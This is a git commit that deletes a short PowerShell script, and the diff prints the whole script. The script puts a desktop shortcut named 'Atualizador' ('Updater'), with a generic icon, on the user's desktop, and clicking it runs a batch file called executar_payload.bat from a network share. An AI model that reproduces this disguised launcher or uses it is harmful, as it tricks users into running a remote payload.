4128a457935201855dbe3290545d5abe025cffa5
Raí Amorim <raidugo.21@outlook.com>
2025-04-05 21:02:03 -0300

    Delete criar_atalho.ps1

--- criar_atalho.ps1
+++
@@ -1,6 +0,0 @@
-$WshShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Desktop\Atualizador.lnk")
-$Shortcut.TargetPath = "cmd.exe"
-$Shortcut.Arguments = "/c start \\192.168.1.137\shared\executar_payload.bat"
-$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,1"
-$Shortcut.Save()
